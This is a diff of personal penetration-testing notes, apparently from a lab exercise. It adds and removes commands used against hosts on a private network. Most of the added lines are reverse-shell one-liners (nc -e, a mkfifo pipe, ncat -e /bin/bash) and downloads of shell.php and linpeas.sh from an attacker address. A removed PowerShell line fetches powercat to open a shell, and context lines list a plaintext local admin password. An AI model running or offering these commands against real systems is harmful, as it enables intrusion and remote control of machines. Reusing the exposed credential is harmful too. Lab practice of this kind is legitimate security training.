@@ -480,10 +480,38 @@ http://10.10.84.12:8080/files/
 # linux or windows? windows
 nmap -sT -A -p 8080 -Pn 10.10.84.12
 sudo nmap 10.10.84.12 --osscan-guess -Pn
+feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt --url http://10.10.84.12:8080
 
-powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.229/powercat.ps1');powercat -c 192.168.45.229 -p 1234 -e cmd"
+# linux commands appear to work in the admin panel
+ls /bin/bash pwd nc ncat /usr/bin/ncat wget curl cd
+# i used these
+ncat nc /bin/bash
+# test these step by step
+whoami
+ifconfig
+wget http://192.168.45.229/shell.php
+nc -e /bin/sh 192.168.45.229 1234
+nc -c bash 192.168.45.229 1234
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.229 1234 >/tmp/f
+# this one finally works
+ncat 192.168.45.229 1234 -e /bin/bash
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+wget http://192.168.45.229/linpeas.sh -O linpeas.sh
 ```
+.12 privesc
+```bash
+/var/lib/samba/usershares
+/usr/local/bin/filebrowser
+/var/crash
+/var/lib/BrlAPI
+/var/metrics
+/var/spool/samba
+/var/tmp
 
+/bin/bash /root/.scripts/tmp_s.sh
+```
 .13 - mail server use for phishing
 ```bash
 sudo nmap -p- -Pn 10.10.76.13 -sS -T 5 --verbose
@@ -755,3 +783,10 @@ Local Admin Passwords:
 - SYDNEY: DowntownAbbey1923
 
 ```
+
+.226 (192)
+```
+
+```
+
+.227 (192)
